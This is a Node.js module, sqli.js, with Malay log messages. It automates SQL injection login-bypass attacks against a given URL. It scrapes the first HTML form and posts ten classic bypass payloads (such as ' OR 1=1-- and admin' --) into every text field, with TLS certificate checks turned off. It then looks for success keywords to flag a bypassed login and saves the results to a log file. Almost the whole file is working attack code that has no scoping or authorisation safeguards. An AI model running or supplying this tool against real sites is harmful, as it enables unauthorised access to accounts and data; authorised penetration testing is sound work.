// 📁 sqli.js (Fix syntax error: removed invalid triple quotes)
const axios = require('axios');
const cheerio = require('cheerio');
const qs = require('qs');
const fs = require('fs');
const path = require('path');
const https = require('https');
const agent = new https.Agent({ rejectUnauthorized: false });

const payloads = [
  "' OR 1=1--",
  "' OR '1'='1",
  "admin' --",
  "admin' #",
  "' OR 1=1 #",
  "' OR 1=1/*",
  "' OR 'a'='a",
  "\" OR 1=1--",
  "' OR 1=1 LIMIT 1--",
  "%27%20OR%201%3D1--"
];

function sanitizeUrl(url) {
  try {
    const clean = new URL(url);
    return clean.origin + clean.pathname;
  } catch (e) {
    return url.split('?')[0].split(':')[0];
  }
}

async function handleSQLiTest(url, callback = () => {}) {
  const startAll = Date.now();
  const log = [];

  const pushLog = (line) => {
    log.push(line);
    callback(line);
  };

  try {
    pushLog(`🔁 Akses awal ke: ${url}`);
    const res = await axios.get(url, { httpsAgent: agent, responseType: 'text', timeout: 10000 });
    pushLog(`✅ Status code: ${res.status}, saiz respon: ${res.data.length} byte`);
    const $ = cheerio.load(res.data);
    const form = $('form').first();
    const inputs = form.find('input');
    const action = form.attr('action') || url;
    const method = (form.attr('method') || 'post').toUpperCase();

    const allFields = {};
    const textFields = [];
    inputs.each((_, el) => {
      const type = ($(el).attr('type') || 'text').toLowerCase();
      const name = $(el).attr('name');
      const value = $(el).attr('value') || '';
      if (!name) return;
      if (["hidden", "submit", "button", "checkbox"].includes(type)) {
        allFields[name] = value || '1';
      } else {
        allFields[name] = value;
        textFields.push(name);
      }
    });

    if (textFields.length === 0) return ['❌ Tiada input text untuk uji.'];
    pushLog(`📥 Dikesan input: ${textFields.join(', ')}`);

    const targetUrl = action.startsWith('http') ? action : new URL(action, url).href;
    const cleanUrl = sanitizeUrl(targetUrl);

    for (let p of payloads) {
      pushLog(`\n🚀 Uji Payload: ${p}`);
      const encoded = encodeURIComponent(p);
      const testData = { ...allFields };
      for (let name of textFields) testData[name] = p;

      try {
        const r = await axios.post(targetUrl, qs.stringify(testData), {
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          httpsAgent: agent,
          timeout: 8000,
          validateStatus: () => true
        });

        const body = r.data.toLowerCase();
        if (body.includes('welcome') || body.includes('dashboard') || body.includes('berjaya') || body.includes('profil')) {
          pushLog(`✅ Respon positif! Ada keyword login berjaya.`);
        } else if (body.includes('ralat') || body.includes('error') || body.includes('invalid')) {
          pushLog(`⚠️ Mungkin inject tak berjaya (respon mengandungi error)`);
        } else {
          pushLog(`❔ Tidak pasti, size: ${body.length} byte`);
        }
      } catch (err) {
        pushLog(`❌ Gagal hantar payload: ${err.message}`);
      }
    }

    const endAll = Date.now();
    const duration = ((endAll - startAll) / 1000).toFixed(1);
    pushLog(`\n⏱️ Masa total scan: ${duration}s`);

    const outputFolder = path.join(__dirname, 'output');
    if (!fs.existsSync(outputFolder)) fs.mkdirSync(outputFolder);
    fs.writeFileSync(path.join(outputFolder, 'payload-scan-log.txt'), log.join('\n'));
    pushLog(`💾 Disimpan ke: output/payload-scan-log.txt`);

    return log;
  } catch (err) {
    return [`❌ Ralat utama: ${err.message}`];
  }
}

module.exports = { handleSQLiTest };
